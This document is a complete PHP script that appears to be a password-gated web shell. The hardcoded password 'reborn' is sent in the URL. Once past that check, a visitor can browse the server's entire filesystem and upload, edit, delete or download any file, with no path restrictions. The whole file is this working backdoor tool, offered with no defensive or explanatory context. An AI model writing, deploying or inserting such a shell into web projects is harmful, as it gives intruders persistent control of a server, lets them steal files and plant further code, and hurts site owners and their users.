<?php
define('ACCESS_PASSWORD', 'reborn');
 $pw = isset($_GET['password']) ? (string) $_GET['password'] : '';
 if (!hash_equals(ACCESS_PASSWORD, $pw))  {
     header('HTTP/1.1 403 Forbidden');
     header('Content-Type: text/plain; charset=utf-8');
     echo "Access denied.\n";
     exit;
}
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);

// Directory Navigation Logic
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = str_replace('\\', '/', $current_dir);
if (is_dir($current_dir)) {
    chdir($current_dir);
}
$current_dir = str_replace('\\', '/', getcwd());

function render_breadcrumbs($dir) {
    $dir = str_replace('\\', '/', $dir);
    $parts = explode('/', $dir);
    
    echo '<div style="font-family: monospace; font-size: 14px; background: #1a1a24; color: #ffb86c; padding: 12px; margin-bottom: 15px; border-radius: 5px; display: block; border-left: 5px solid #ff79c6; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">';
    echo '<span style="color: #ff79c6; font-size: 16px; margin-right: 8px;">📁</span>';
    
    $accumulated = '';
    $is_linux = (strpos($dir, '/') === 0);
    
    if ($is_linux) {
        echo '<a href="?password=' . urlencode(ACCESS_PASSWORD) . '&dir=/" style="color: #50fa7b; text-decoration: none; font-weight: bold;">/</a>';
    }
    
    foreach ($parts as $part) {
        if ($part === '') continue;
        if ($accumulated === '') {
            $accumulated = $part;
        } else {
            $accumulated .= '/' . $part;
        }
        
        $url_dir = $accumulated;
        if ($is_linux && strpos($url_dir, '/') !== 0) {
            $url_dir = '/' . $url_dir;
        }
        
        echo ' <span style="color: #6272a4;">/</span> <a href="?password=' . urlencode(ACCESS_PASSWORD) . '&dir=' . urlencode($url_dir) . '" style="color: #ffb86c; text-decoration: none; font-weight: 500;" onmouseover="this.style.textDecoration=\'underline\'" onmouseout="this.style.textDecoration=\'none\'">' . htmlspecialchars($part) . '</a>';
    }
    echo '</div>';
}

function list_files()  {
    $directory = getcwd();
    $files = scandir($directory);
    if ($files === false)  {
        echo 'Failed to list files.';
        return;
    }
    
    render_breadcrumbs($directory);
    
    echo '<style>
        body { font-family: monospace; background-color: #282a36; color: #f8f8f2; padding: 20px; margin: 0; }
        a { color: #8be9fd; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .list-container { background: #343746; border-radius: 6px; box-shadow: 0 4px 10px rgba(0,0,0,0.35); padding: 15px; margin-top: 15px; }
        .file-item { display: flex; align-items: center; padding: 8px 10px; border-bottom: 1px solid #44475a; transition: background 0.2s; }
        .file-item:hover { background: #44475a; }
        .file-icon { font-size: 16px; margin-right: 10px; width: 20px; text-align: center; }
        .file-actions { margin-right: 15px; font-size: 12px; color: #6272a4; min-width: 180px; }
        .file-actions a { margin: 0 5px; }
        .file-name { flex-grow: 1; font-weight: bold; word-break: break-all; }
        .dir-link { color: #50fa7b; }
        .btn-upload { background: #ff79c6; color: #fff; border: none; padding: 8px 15px; font-family: monospace; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .btn-upload:hover { background: #ff92df; }
        .form-upload { background: #343746; padding: 15px; border-radius: 6px; margin-top: 15px; border-left: 5px solid #8be9fd; }
    </style>';
    
    echo '<div class="list-container">';
    
    $dirs_list = [];
    $files_list = [];
    
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            if ($file === '..') {
                $parent_dir = dirname($directory);
                $dirs_list[] = [
                    'name' => '.. [Parent Directory]',
                    'path' => $parent_dir,
                    'is_parent' => true
                ];
            }
            continue;
        }
        
        $full_path = $directory . '/' . $file;
        if (is_dir($full_path)) {
            $dirs_list[] = [
                'name' => $file,
                'path' => $full_path,
                'is_parent' => false
            ];
        } else {
            $files_list[] = $file;
        }
    }
    
    foreach ($dirs_list as $dir_item) {
        $dir_param = '&dir=' . urlencode($directory);
        echo '<div class="file-item">';
        echo '<span class="file-icon">📁</span>';
        echo '<div class="file-actions">';
        if (!$dir_item['is_parent']) {
            echo '<a href="?password=' . urlencode(ACCESS_PASSWORD) . '&action=delete&file=' . urlencode($dir_item['name']) . $dir_param . '" onclick="return confirm(\'Are you sure you want to delete this folder?\');" style="color: #ff5555;">Delete</a>';
        } else {
            echo '<span style="color: #6272a4;">-</span>';
        }
        echo '</div>';
        echo '<div class="file-name"><a href="?password=' . urlencode(ACCESS_PASSWORD) . '&dir=' . urlencode($dir_item['path']) . '" class="dir-link">' . htmlspecialchars($dir_item['name']) . '/</a></div>';
        echo '</div>';
    }
    
    foreach ($files_list as $file) {
        $dir_param = '&dir=' . urlencode($directory);
        echo '<div class="file-item">';
        echo '<span class="file-icon">📄</span>';
        echo '<div class="file-actions">';
        echo '<a href="?password=' . urlencode(ACCESS_PASSWORD) . '&action=edit&file=' . urlencode($file) . $dir_param . '" style="color: #50fa7b;">Edit</a> | ';
        echo '<a href="?password=' . urlencode(ACCESS_PASSWORD) . '&action=delete&file=' . urlencode($file) . $dir_param . '" onclick="return confirm(\'Are you sure you want to delete this file?\');" style="color: #ff5555;">Delete</a> | ';
        echo '<a href="?password=' . urlencode(ACCESS_PASSWORD) . '&action=download&file=' . urlencode($file) . $dir_param . '" style="color: #8be9fd;">Download</a>';
        echo '</div>';
        echo '<div class="file-name">' . htmlspecialchars($file) . '</div>';
        echo '</div>';
    }
    
    echo '</div>';
}

function handle_upload()  {
    if (isset($_FILES['file']))  {
        $uploaded_file = $_FILES['file'];
        $upload_path = getcwd() . '/' . basename($uploaded_file['name']);
        if (move_uploaded_file($uploaded_file['tmp_name'], $upload_path))  {
            echo '<div style="color: #50fa7b; font-weight: bold; margin-bottom: 10px;">File uploaded successfully to: ' . htmlspecialchars($upload_path) . '</div>';
        } else  {
            echo '<div style="color: #ff5555; font-weight: bold; margin-bottom: 10px;">File upload failed.</div>';
        }
    } else  {
        echo '<div style="color: #ff5555; font-weight: bold; margin-bottom: 10px;">No file uploaded.</div>';
    }
    list_files();
}

function handle_edit()  {
    $directory = getcwd();
    $dir_param = '&dir=' . urlencode($directory);
    
    if (isset($_GET['file']))  {
        $file = $_GET['file'];
        if (isset($_POST['content']))  {
            $content = $_POST['content'];
            if (file_put_contents($file, $content) !== false)  {
                echo '<div style="color: #50fa7b; font-weight: bold; margin-bottom: 10px;">File edited successfully.</div>';
            } else  {
                echo '<div style="color: #ff5555; font-weight: bold; margin-bottom: 10px;">File edit failed.</div>';
            }
            list_files();
        } else  {
            if (file_exists($file))  {
                $file_contents = file_get_contents($file);
                echo '<style>
                    body { font-family: monospace; background-color: #282a36; color: #f8f8f2; padding: 20px; }
                    textarea { background: #1a1a24; color: #f8f8f2; border: 1px solid #44475a; border-radius: 4px; padding: 10px; width: 100%; box-sizing: border-box; font-family: monospace; font-size: 14px; }
                    .btn-save { background: #50fa7b; color: #282a36; border: none; padding: 10px 20px; font-family: monospace; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
                    .btn-save:hover { background: #62ff8e; }
                    .btn-back { background: #6272a4; color: #fff; padding: 10px 20px; border-radius: 4px; text-decoration: none; display: inline-block; font-weight: bold; margin-right: 10px; }
                </style>';
                echo '<h3>Editing: ' . htmlspecialchars($file) . '</h3>';
                echo '<form method="post" action="?password=' . urlencode(ACCESS_PASSWORD) . '&action=edit&file=' . urlencode($file) . $dir_param . '">';
                echo '<textarea name="content" rows="25">' . htmlspecialchars($file_contents) . '</textarea><br>';
                echo '<a href="?password=' . urlencode(ACCESS_PASSWORD) . $dir_param . '" class="btn-back">Cancel / Back</a>';
                echo '<input type="submit" value="Save File" class="btn-save">';
                echo '</form>';
            } else  {
                echo '<div style="color: #ff5555; font-weight: bold; margin-bottom: 10px;">File not found.</div>';
                list_files();
            }
        }
    } else  {
        echo '<div style="color: #ff5555; font-weight: bold; margin-bottom: 10px;">No file specified for edit.</div>';
        list_files();
    }
}

function handle_delete()  {
    if (isset($_GET['file']))  {
        $file = $_GET['file'];
        if (file_exists($file))  {
            $success = is_dir($file) ? rmdir($file) : unlink($file);
            if ($success)  {
                echo '<div style="color: #50fa7b; font-weight: bold; margin-bottom: 10px;">Deleted successfully.</div>';
            } else  {
                echo '<div style="color: #ff5555; font-weight: bold; margin-bottom: 10px;">Deletion failed.</div>';
            }
        } else  {
            echo '<div style="color: #ff5555; font-weight: bold; margin-bottom: 10px;">File/Folder not found.</div>';
        }
    } else  {
        echo '<div style="color: #ff5555; font-weight: bold; margin-bottom: 10px;">No target specified for delete.</div>';
    }
    list_files();
}

function handle_download()  {
    if (isset($_GET['file']))  {
        $file = $_GET['file'];
        if (file_exists($file))  {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        } else  {
            echo '<div style="color: #ff5555; font-weight: bold; margin-bottom: 10px;">File not found.</div>';
        }
    } else  {
        echo '<div style="color: #ff5555; font-weight: bold; margin-bottom: 10px;">No file specified for download.</div>';
    }
    list_files();
}

if (isset($_GET['action']))  {
    $action = $_GET['action'];
    switch ($action)  {
        case 'list': list_files();
        break;
        case 'upload': handle_upload();
        break;
        case 'edit': handle_edit();
        break;
        case 'delete': handle_delete();
        break;
        case 'download': handle_download();
        break;
        default: echo 'Invalid action.';
    }
} else  {
    list_files();
    $directory = getcwd();
    $dir_param = '&dir=' . urlencode($directory);
    echo '<div class="form-upload">';
    echo '<h4 style="margin: 0 0 10px 0; color: #8be9fd;">Upload File to Current Folder</h4>';
    echo '<form enctype="multipart/form-data" method="post" action="?password=' . urlencode(ACCESS_PASSWORD) . '&action=upload' . $dir_param . '">';
    echo '<input type="file" name="file" style="margin-right: 10px; color: #f8f8f2;">';
    echo '<input type="submit" value="Upload File" class="btn-upload">';
    echo '</form>';
    echo '</div>';
}
?>